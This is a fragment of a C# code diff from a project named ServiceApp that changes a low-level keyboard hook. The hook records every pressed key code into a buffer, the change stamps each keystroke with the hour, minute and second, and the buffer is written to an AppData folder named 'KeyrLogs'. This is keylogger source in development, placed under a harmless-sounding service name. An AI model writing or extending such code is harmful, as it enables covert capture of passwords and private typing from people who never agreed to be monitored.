@@ -52,11 +52,13 @@ namespace ServiceApp
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
             {
                 int vkCode = Marshal.ReadInt32(lParam);
-                Debug.WriteLine($"Key pressed: {vkCode}");
                 buffer.Append(vkCode);
-                //string hour = DateTime.Now.Hour.ToString();
-                //buffer.Append($":" + hour);
-                if(ok != 9)
+                string hour = DateTime.Now.Hour.ToString();
+                string minute = DateTime.Now.Minute.ToString();
+                string second = DateTime.Now.Second.ToString();
+                Debug.WriteLine($"Key pressed: {vkCode}:{hour}:{minute}:{second}");
+                buffer.Append($":{hour}:{minute}:{second}");
+                if (ok != 9)
                 buffer.Append(" ");
 
                 ok++;
@@ -77,7 +79,7 @@ namespace ServiceApp
 
             string data = buffer.ToString();
             buffer.Clear();
-
+            
             string folder = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "KeyrLogs"); 
 
             if (!Directory.Exists(folder))
